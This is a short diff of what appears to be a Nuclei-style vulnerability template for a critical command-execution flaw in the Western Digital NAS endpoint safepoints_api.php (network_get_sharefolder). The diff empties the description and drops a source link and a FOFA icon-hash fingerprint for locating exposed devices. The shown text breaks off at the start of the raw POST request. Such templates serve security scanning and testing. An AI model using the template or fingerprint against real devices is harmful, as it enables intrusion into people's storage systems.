@@ -3,12 +3,8 @@ info:
   name: 西部数据 NAS safepoints_api.php network_get_sharefolder 命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ho4evp8k9un8hvho'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ho4evp8k9un8hvho
-    fofa: icon_hash="-1074357885"
 http:
 - raw:
   - 'POST /web/addons/safepoints_api.php HTTP/1.1
